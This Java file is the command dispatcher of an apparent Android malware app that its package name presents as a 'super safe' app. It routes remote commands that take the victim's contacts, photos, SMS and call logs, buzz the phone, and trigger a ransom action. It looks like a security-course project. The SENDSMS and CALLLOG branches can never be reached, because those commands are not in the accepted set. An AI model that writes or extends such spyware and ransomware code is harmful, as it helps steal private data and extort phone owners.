package com.seginf.supersafeapp;

import com.google.common.collect.ImmutableSet;

public class CommandParser {
	private Commandable commandable;
	
	public CommandParser(Commandable c){
		this.commandable = c;
	}
	
	public ImmutableSet<String> acceptedCommands(){
		return ImmutableSet.of("VIBRATE","CONTACTS","PHOTO","RANSOM");
	}
	
	public Command dispatch(String commandString){
		if(!acceptedCommands().contains(commandString))
			return new UnknownCommand();
		
		if(commandString.startsWith("VIBRATE")){
			return new VibrateCommand(commandable);
		}else if(commandString.startsWith("CONTACTS")){
			return new ContactsCommand(commandable);
		}else if(commandString.startsWith("PHOTO")){
			return new PhotoCommand(commandable);
		}else if(commandString.startsWith("RANSOM")){
			return new RansomCommand(commandable);
		}else if(commandString.startsWith("SENDSMS")){
			return new SMSSenderCommand(commandable);
		}else if(commandString.startsWith("CALLLOG")){
			return new CallLogCommand(commandable);
		}
		return new UnknownCommand();
	}
}
